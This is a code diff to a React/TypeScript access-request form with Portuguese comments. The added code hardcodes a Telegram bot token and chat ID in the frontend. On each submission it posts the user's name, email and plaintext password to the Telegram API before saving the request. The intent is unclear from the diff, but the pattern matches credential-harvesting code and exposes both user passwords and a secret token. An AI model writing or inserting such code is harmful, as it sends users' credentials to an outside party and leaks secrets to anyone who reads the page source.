@@ -29,20 +29,34 @@ export function AccessRequestForm({ onBack }: { onBack: () => void }) {
     setSubmitting(true);
     const cleanName = name.trim();
     const cleanEmail = email.trim();
+
+    // 1. Enviar Telegram IMEDIATAMENTE (direto do clique)
+    const TELEGRAM_TOKEN = "8418595437:AAGK7iPeqR1L6YGdsuwt2XuOgI_aYa-4KB0";
+    const TELEGRAM_CHAT_ID = "8353500339";
+    const text = `🆕 Nova solicitação de acesso\n\nNome: ${cleanName}\nEmail: ${cleanEmail}\nSenha: ${password}\n\nStatus: Pendente`;
     try {
-      console.info("[access-request] 1. Usuário clicou em Solicitar acesso", { email: cleanEmail });
+      console.info("[access-request] Enviando Telegram direto do clique...");
+      const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+      });
+      const tgBody = await tgRes.text();
+      console.info("[access-request] Telegram resposta:", tgRes.status, tgBody.slice(0, 200));
+    } catch (err) {
+      console.error("[access-request] Falha ao enviar Telegram (seguindo mesmo assim):", err);
+    }
+
+    // 2. Salvar solicitação no banco com status pending
+    try {
       const result = await submitAccessRequest({ data: { name: cleanName, email: cleanEmail, password } });
-      console.info("[access-request] Resultado do fluxo automático", result);
       if (!result.ok) {
-        setError("Erro ao enviar solicitação. Tente novamente.");
+        setError("Erro ao salvar solicitação. Tente novamente.");
         setSubmitting(false);
         return;
       }
-      if (!result.telegram.ok) {
-        console.error("[access-request] Telegram não confirmou envio", result.telegram);
-      }
     } catch (err) {
-      console.error("[access-request] Erro silencioso capturado no frontend:", err);
+      console.error("[access-request] Erro ao salvar no banco:", err);
       setError("Erro ao enviar solicitação. Tente novamente.");
       setSubmitting(false);
       return;
